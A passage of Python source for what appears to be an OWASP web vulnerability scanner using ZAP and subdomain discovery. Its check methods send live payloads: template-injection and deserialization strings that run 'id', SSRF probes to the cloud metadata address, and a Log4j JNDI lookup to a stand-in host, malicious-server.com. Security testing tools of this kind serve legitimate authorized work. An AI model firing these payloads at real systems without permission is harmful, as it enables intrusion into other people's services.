            "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "<%= system('id') %>"
        ]
        for payload in payloads:
            async with session.get(urljoin(url, f"template?name={quote(payload)}"), timeout=10) as response:
                text = await response.text()
                if "49" in text or "uid=" in text:
                    return True
        return False

    async def check_insecure_deserialization_enhanced(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [
            ("php", "O:8:\"stdClass\":1:{s:4:\"pipe\";s:2:\"id\";}"),
            ("java", "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAADZm9veA=="),
            ("python", "cposix\nsystem\np0\n(S'id'\np1\ntp2\nRp3\n.")
        ]
        for lang, payload in payloads:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            async with session.post(urljoin(url, "deserialize"), data={"data": payload}, headers=headers, timeout=10) as response:
                text = await response.text()
                if "uid=" in text or "stdClass" in text or "posix.system" in text:
                    self.results.append({"type": "Insecure Deserialization", "language": lang, "url": url})
                    return True
        return False

    async def check_graphql_vulnerabilities(self, session: aiohttp.ClientSession, url: str) -> bool:
        queries = [
            # Introspection query
            '{"query": "{ __schema { types { name } } }"}',
            # Nested query
            '{"query": "{ user(id: 1) { posts { comments { author { posts { comments { body } } } } } } }"}',
            # Query with fragment
            '{"query": "query { user(id: 1) { ...userFields } } fragment userFields on User { id name email }"}'
        ]
        for query in queries:
            async with session.post(urljoin(url, 'graphql'), json=json.loads(query), timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    if '__schema' in str(data) or 'userFields' in str(data):
                        return True
        return False

    async def check_api_vulnerabilities(self, session: aiohttp.ClientSession, url: str) -> bool:
        endpoints = ['users', 'orders', 'products']
        for endpoint in endpoints:
            async with session.get(urljoin(url, f'api/{endpoint}'), timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    if isinstance(data, list) and len(data) > 0:
                        if 'password' in str(data) or 'credit_card' in str(data):
                            self.results.append({"type": "API Excessive Data Exposure", "endpoint": endpoint, "url": url})
                            return True
        return False

    async def check_ssrf_enhanced(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1:22',
            'http://localhost:22',
            'https://raw.githubusercontent.com/nmap/nmap/master/nmap-services' # try to access a list of ports
        ]
        for payload in payloads:
            async with session.get(urljoin(url, f'fetch?url={quote(payload)}'), timeout=10) as response:
                text = await response.text()
                if 'ami-id' in text or 'SSH' in text or 'tcpmux' in text:
                    return True
        return False

    async def check_log4j_vulnerability(self, session: aiohttp.ClientSession, url: str) -> bool:
        headers = {
            'User-Agent': '${jndi:ldap://malicious-server.com/a}',
            'X-Api-Version': '${jndi:ldap://malicious-server.com/a}'
        }
        async with session.get(url, headers=headers, timeout=10) as response:
            if 'Reference Class Name: javax.naming.InitialContext' in await response.text():
                return True
        return False

    async def check_improper_input_validation(self, session: aiohttp.ClientSession, url: str) -> bool:
        payloads = [
            ('email', 'notanemail'),
            ('zipcode', '1234567890'),
            ('phone', 'abcdefghij'),
            ('date', '13/13/2021')
        ]
        for field, value in payloads:
            async with session.post(urljoin(url, 'submit'), data={field: value}, timeout=10) as response:
                if response.status == 200:
                    return True
        return False
      
        # Add more vulnerability check methods here

async def scan_target(url: str, api_key: str, timeout: int, config: Dict[str, Any], proxy: Optional[str] = None) -> List[Dict[str, Any]]:
    zap_options = {'apikey': api_key, 'proxies': {'http': config['zap_url'], 'https': config['zap_url']}}
    if proxy:
        zap_options['proxies'] = {'http': proxy, 'https': proxy}
    zap = ZAPv2(**zap_options)
    scanner = VulnerabilityScanner(url, timeout, zap, config)
    
    print(f"Scanning {url}...")
    await scanner.start_zap_scan()
    await scanner.run_scans()
    
    return scanner.results

async def save_progress(filename: str, scanned_subdomains: List[str]):
    async with aiofiles.open(filename, 'wb') as f:
        await f.write(pickle.dumps(scanned_subdomains))

async def load_progress(filename: str) -> List[str]:
    if Path(filename).exists():
        async with aiofiles.open(filename, 'rb') as f:
            content = await f.read()
            return pickle.loads(content)
    return []

async def main(domain: str, api_key: str, timeout: int, output_file: str, config: Dict[str, Any], proxy: Optional[str] = None, resume: bool = False):
    print("OWASP Vulnerability Scanner with Subdomain Discovery")
    print("----------------------------------------------------")
    print(f"Target Domain: {domain}")
    print("This tool is for educational and authorized testing purposes only.")
    print("Ensure you have permission to scan the target domain and its subdomains.")
    confirmation = input("Do you want to proceed? (y/n): ").lower()
    if confirmation != 'y':
        print("Scan aborted.")
        return

    print("Discovering subdomains...")
    subdomains = await discover_subdomains(domain)
    print(f"Found {len(subdomains)} subdomains.")

    progress_file = f"{domain}_progress.pkl"
    scanned_subdomains = await load_progress(progress_file) if resume else []
    subdomains_to_scan = [s for s in subdomains if s not in scanned_subdomains]

    all_results = []
    for subdomain in tqdm(subdomains_to_scan, desc="Scanning subdomains"):
        for scheme in ['http', 'https']:
            url = f"{scheme}://{subdomain}"
            results = await scan_target(url, api_key, timeout, config, proxy)
            all_results.extend(results)
        scanned_subdomains.append(subdomain)
        await save_progress(progress_file, scanned_subdomains)

    if output_file:
        await save_results(output_file, all_results)
        print(f"All scan results saved to {output_file}")
    else:
        print("Scan completed. Check the log file for details.")

async def save_results(filename: str, results: List[Dict[str, Any]]):
    async with aiofiles.open(filename, 'w') as f:
        await f.write(json.dumps(results, indent=2))
    logger.info(f"Scan results saved to {filename}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OWASP Vulnerability Scanner with Subdomain Discovery")
    parser.add_argument('domain', help="The target domain to scan")
    parser.add_argument('--apikey', help="ZAP API key", required=True)
    parser.add_argument('--timeout', type=int, default=300, help="Timeout for ZAP scan in seconds")
    parser.add_argument('--output', help="Output file for scan results (JSON format)")
    parser.add_argument('--config', default='config.yaml', help="Path to configuration file")
    parser.add_argument('--debug', action='store_true', help="Enable debug logging")
    parser.add_argument('--proxy', help="Proxy server to use for scans")
    parser.add_argument('--resume', action='store_true', help="Resume from the last scan")
    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)

    config = load_config(args.config)

    asyncio.run(main(args.domain, args.apikey, args.timeout, args.output, config, args.proxy, args.resume))
